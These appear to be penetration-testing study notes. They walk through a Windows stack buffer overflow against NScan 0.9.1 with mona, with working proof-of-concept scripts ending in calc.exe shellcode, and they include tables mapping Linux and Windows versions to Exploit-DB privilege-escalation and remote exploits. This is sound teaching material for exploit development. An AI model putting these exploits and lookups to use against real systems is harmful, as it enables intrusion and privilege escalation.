# Exploit

Exploit are divided by

* client side exploits
* remote exploits \(server side exploits\)
* local privilege escalation exploits


## Exploit Development - Buffer Overflow



## Windows Exploit

### Fuzzing

Fuzz the field with long string to see how many characters are required to crash the program

```python
python -c “print ‘A’*1100”
```

Attach the program to immunity debugger

### Find the EIP offset

Place the “mona.py” file inside the PyCommands folder in the Immunity directory (`C:⧵Program Files⧵Immunity Inc⧵Immunity Debugger⧵PyCommands`)

Type command

```
!mona config -set workingfolder c:⧵logs⧵%p
```

Generate pattern (same as metasploit pattern_create.rb)

```
!mona pattern_create 1100
```

Check the EIP register and you'll see 0x68423268
Use Mona again to find the exact part of the buffer where we can overwrite EIP by 
```
!mona pattern_offset 0x68423268
```

Output returns
```
Pattern h2Bh (0x68423268) found in cyclic pattern at position 997
```

Mona also provides more information about the overflowed buffer
```
!mona findmsp
```

Develop POC script to test out the offset

```text
nscan_poc.py #1 Stack Diagram
 997 bytes 4 bytes
 +------------------------------+------------------+--------------------+
 |                              |                  |                    |
 | junk (AAAAAA...)             | eip (0x42424242) | fill (CCCCCC...)   |
 |                              |                  |                    |
 +------------------------------+------------------+--------------------+
 BUF_SIZE = 1100 bytes
```

```python
exploit = junk + eip                           # Combine junk + eip into exploit buffer
fill = "\x43"*(BUF_SIZE-len(exploit))          # Calculate number of filler bytes to us
buf = exploit + fill                           # Combine everything together for exploi
try:
  f = open("c:\\nscan_poc.txt", "wb")          # Exploit output will be written to C di
  f.write(buf)                                 # Write entirety of buffer out to file
  f.close()                                    # Close file
  print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
  print "\nExploit written successfully!"
  print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to e
except Exception, e:
  print "\nError! Exploit could not be generated, error details follow:\n"
  print str(e) + "\n"
```

### Loading EIP with our own address and mock code

```
ESP (0x00d3ff18) points at offset 1001 in normal pattern (length 99)
```
We can see from the !mona findmsp output previously that it contains our generated pattern and has 99 bytes of space for our code

Use Mona again to find a suitable assembly instruction to jump into ESP and execute code from the stack

```
!mona jmp -r esp
```

Go back into the dig folder where you’ll find a file named “jmp”

We would like to choose an instruction that comes from an application module because this will allow our exploit to be more portable. But, since this isn’t the case here, we’ll settle for a Windows module that is usually present on Windows installations called kernel32.dll.

```text
nscan_poc.py #2 Stack Diagram

                                          +----------+
       997 bytes                 4 bytes  |          v
+------------------------------+----------+-------+--------------------------+------------------+
|                              |                  |                          |                  |
| junk (AAAAAA...)             | eip (0x7C836A78) | shellcode (INT 0xCC...)  | fill (CCCCCC...) |
|                              |                  |                          |                  |
+------------------------------+------------------+--------------------------+------------------+
                         BUF_SIZE = 1100 bytes

```

```python

import struct
 
BUF_SIZE = 1100                         # Set a consistent total buffer size
 
junk = "\x41"*997                       # 997 bytes to hit EIP
eip = struct.pack("<L", 0x7c836a78)     # Use little-endian to format address 0x7c836a78 # call esp # kernel32.dll
shellcode = "\xCC"*45                   # 45 bytes of mock interrupt (INT) code
 
exploit = junk + eip + shellcode        # Combine our eip with jump to stack including mock code
fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill                    # Combine everything together for exploitation
 
try:
    f = open("c:\\nscan_poc.txt", "wb") # Exploit output will be written to C directory
    f.write(buf)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"
    
```
### Shellcode and popping calc.exe

```text
nscan_poc.py #3 Stack Diagram

                                          +----------+            +-------------+
       997 bytes                 4 bytes  |          v   16 bytes |             v
+------------------------------+----------+-------+---------------+-----------+------------------------------------+------------------+
|                              |                  |                           |                                    |                  |
| junk (AAAAAA...)             | eip (0x7C836A78) |  NOP sled (0x90 0x90 ...) | shellcode (calc.exe 0x31 0xC9 ...) | fill (CCCCCC...) |
|                              |                  |                           |                                    |                  |
+------------------------------+------------------+---------------------------+------------------------------------+------------------+
                         BUF_SIZE = 1100 bytes

```

```python
import struct
 
BUF_SIZE = 1100                         # Set a consistent total buffer size
 
junk = "\x41"*997                       # 997 bytes to hit EIP
eip = struct.pack("<L", 0x7c836a78)     # Use little-endian to format address 0x7c836a78 # call esp # kernel32.dll
nops = "\x90"*16                        # 16 byte NOP sled to get into our shellcode
 
# calc.exe shellcode for WinXP SP3 on stack
shellcode = "\x31\xC9"                  # xor ecx,ecx
shellcode += "\x51"                     # push ecx
shellcode += "\x68\x63\x61\x6C\x63"     # push 0x636c6163
shellcode += "\x54"                     # push dword ptr esp
shellcode += "\xB8\xC7\x93\xC2\x77"     # mov eax,0x77c293c7
shellcode += "\xFF\xD0"                 # call eax
 
exploit = junk + eip + nops + shellcode # Combine our exploit with a NOP sled and working shellcode
fill = "\x43"*(BUF_SIZE-len(exploit))   # Calculate number of filler bytes to use (C)
buf = exploit + fill                    # Combine everything together for exploitation
 
try:
    f = open("c:\\nscan_poc.txt", "wb") # Exploit output will be written to C directory
    f.write(buf)                        # Write entirety of buffer out to file
    f.close()                           # Close file
    print "\nNScan 0.9.1 Saved Return Pointer Overwrite Exploit"
    print "\nExploit written successfully!"
    print "Buffer size: " + str(len(buf)) + "\n" # Buffer size sanity check to ensure there's nothing funny going on
except Exception, e:
    print "\nError! Exploit could not be generated, error details follow:\n"
    print str(e) + "\n"

```

### Test for bad characters


## Linux Exploit





Command to search exploit in Kali Linux:

> searchsploit \[software\]

### Linux Exploit Suggester

Check linux version:

> uname -a

Go to /usr/share/linux-exploit-suggester and run:

> ./Linux\_Exploit\_Suggester.pl -k 3.0.0

### Linux Exploit Table

| Linux Version | Vul Name | Exploit-DB |
| :--- | :--- | :--- |
| Kernel 2.26.x | Udev 1.4.1 | [https://www.exploit-db.com/exploits/8478/](https://www.exploit-db.com/exploits/8478/) |
| Kernel 2.26.22 - 3.9 | Dirtycow | [https://www.exploit-db.com/exploits/40839/](https://www.exploit-db.com/exploits/40839/) |
| Kernel 3.13.0-32 | Overlayfs | [https://www.exploit-db.com/exploits/37292/](https://www.exploit-db.com/exploits/37292/) |
| Samba 2.2.\* | Remote buffer overflow | [https://www.exploit-db.com/exploits/7/](https://www.exploit-db.com/exploits/7/) |
| Kernel 2.6.39-3.2.2 or Ubuntu 11.10 | Mempodipper | [https://www.exploit-db.com/exploits/35161/](https://www.exploit-db.com/exploits/35161/) |
| Kernel 2.6.37 ubuntu 10.04 | Full-nelson | [https://www.exploit-db.com/exploits/15704/](https://www.exploit-db.com/exploits/15704/) |
| Kernel under 2.6.32.2 Ubuntu 10.04 | Half-nelson | [https://www.exploit-db.com/exploits/17787/](https://www.exploit-db.com/exploits/17787/) |
| FreeBSD 9.0/9.1 | mmap/ptrace | [https://www.exploit-db.com/exploits/26368/](https://www.exploit-db.com/exploits/26368/) |
| Kernel 2.4.x/2.6.x | compile as: gcc -Wall -o 9545 9545.c -Wl,--hash-style=both | [https://www.exploit-db.com/exploits/9545/](https://www.exploit-db.com/exploits/9545/) |

## Windows Exploit

| Exploit-DB | Vul Name | MS\# | 2000 | XP | 2003 | 2008 | Vista | 7 |
| :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- | :--- |
| 100 | RPC DCOM Long File | MS03-026 | SP3/4 | - | - | - | - | - |
| 103 | RPC2 | MS03-039 | all \(CN\) | - | - | - | - | - |
| 109 | RPC2 | MS03-039 | all | - | - | - | - | - |
| 119 | Netapi | MS03-049 | SP4 | - | - | - | - | - |
| 3022 | ASN.1 | MS04-007 | SP2/3/4 | SP0/1 | - | - | - | - |
| 275 | SSL BOF | MS04-011 | SP4 | ? | - | - | - | - |
| 295 | Lsasarv.dll | MS04-011 | SP2/3/4 | SP0/1 | - | - | - | - |
| 734 | NetDDE BOF | MS04-031 | SP2/3/4 | SP0/1 | - | - | - | - |
| 1075 | Messaging Queue | MS05-017 | SP3/4 | SP0/1 | - | - | - | - |
| 1149 | PnP Service | MS05-039 | SP4 | - | - | - | - | - |
| 2223 | Canonicalize Pathname | MS06-040 | - | SP1 | - | - | - | - |
| 2265 | NetIPSRemote | MS06-040 | SP0-4 | SP0/1 | - | - | - | - |
| 2789 | NetPManageIPCConn | MS06-070 | SP4 | - | - | - | - | - |
| 7104 | Service Code Exec | MS08-067 | SP4 | SP2/3 | SP1/2 | SP0 | SP0/1 | - |
| 7132 | Service Code Exec | MS08-067 | SP4 | - | SP2 | - | - | - |
| 14674 | SRV2.SYS SMB | MS09-050 | - | - | - | - | SP1/2 | - |
| 14607 | Trans2Zero | MS10-054 |  |  |  |  |  |  |

### Buffer Overflow

{% embed data="{\"url\":\"http://www.primalsecurity.net/0x0-exploit-tutorial-buffer-overflow-vanilla-eip-overwrite-2/\",\"type\":\"link\",\"title\":\"0x0 Exploit Tutorial: Buffer Overflow - Vanilla EIP Overwrite\",\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://i0.wp.com/www.primalsecurity.net/wp-content/uploads/2014/07/6\_set\_breakpoint\_JMP\_ESP.png?fit=803%2C313\",\"width\":803,\"height\":313,\"aspectRatio\":0.38978829389788294}}" %}

### Exploit Modification

{% embed data="{\"url\":\"http://www.dafthack.com/basic-exploit-mod-part-1\",\"type\":\"link\",\"title\":\"Basic Exploit Modification part 1: Porting to a Different OS Version - DAFTHACK\",\"description\":\"A security blog by Beau Bullock.\",\"icon\":{\"type\":\"icon\",\"url\":\"http://www.gstatic.com/sites/p/470f76/system/app/images/apple-touch-icon.png\",\"aspectRatio\":0}}" %}

{% embed data="{\"url\":\"http://www.dafthack.com/basic-exploit-mod-part-2\",\"type\":\"link\",\"title\":\"Basic Exploit Modification part 2: Changing Shellcode - DAFTHACK\",\"description\":\"A security blog by Beau Bullock.\",\"icon\":{\"type\":\"icon\",\"url\":\"http://www.gstatic.com/sites/p/470f76/system/app/images/apple-touch-icon.png\",\"aspectRatio\":0}}" %}

### From Metasploit to Standalone Exploit

{% embed data="{\"url\":\"https://netsec.ws/?p=262\",\"type\":\"link\",\"title\":\"Converting Metasploit Module to Stand Alone\",\"icon\":{\"type\":\"icon\",\"url\":\"https://netsec.ws/wp-content/themes/genesis-sample/images/favicon.ico\",\"aspectRatio\":0}}" %}

